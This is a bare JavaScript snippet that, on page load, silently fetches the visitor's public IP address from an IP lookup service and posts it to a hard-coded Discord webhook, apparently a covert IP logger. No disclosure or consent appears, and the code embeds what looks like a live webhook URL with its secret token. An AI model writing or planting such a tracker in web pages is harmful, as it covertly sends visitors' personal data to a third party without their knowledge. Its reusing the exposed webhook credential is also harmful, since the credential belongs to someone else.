window.addEventListener('load', function() {
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        sendToDiscordWebhook(data.ip);
      })
      .catch(error => {
        console.error(error);
      });
  
    function sendToDiscordWebhook(ip) {
      var webhookURL = 'https://discord.com/api/webhooks/1111705086830325901/a5s-Em5pPg_uQlxhpVdhdNTqbqqJqcSffKPWX15MTzCxa0SIkXDO0FrJQLVUVU6FcXD6'; 
  
      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: 'IP: ' + ip
        })
      })
      .then(() => console.log('IP sent to Discord webhook.'))
      .catch(error => console.error('Error sending IP to Discord webhook:', error));
    }
  });
  